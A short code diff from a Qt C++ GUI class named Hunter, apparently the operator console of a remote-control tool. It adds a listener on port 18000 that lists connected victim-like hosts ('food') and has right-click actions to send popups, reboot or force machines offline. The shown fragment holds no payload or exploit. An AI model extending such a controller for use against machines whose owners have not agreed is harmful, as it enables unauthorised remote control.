@@ -65,13 +65,21 @@ Hunter::Hunter(QWidget *parent)
     QAction *actSendBox = m_Rclick->addAction("发送弹窗");
     QAction *actReboot = m_Rclick->addAction("重启电脑");
     QAction *actOffline = m_Rclick->addAction("强制下线");
+    connect(actSendBox, &QAction::triggered, [=](){
+        qDebug()<<"hello";
+    });
 
     // 将菜单添加至鼠标事件中 再拦截鼠标事件得以处理
     m_Rclick->installEventFilter(this);
 
 
     // 测试
-    addFoodToTbl(1, "sumkee911", "127.0.0.1", 8888, "Windows 7");
+    mCook = new Cook(this);
+    connect(mCook, SIGNAL(foodLogin(int,QString,QString,int,QString)),
+            this, SLOT(addFoodToTbl(int,QString,QString,int,QString)));
+    connect(mCook, SIGNAL(foodLogout(int)), this, SLOT(rmFoodFromTbl(int)));
+    mCook->start(18000);
+
 
 
 }
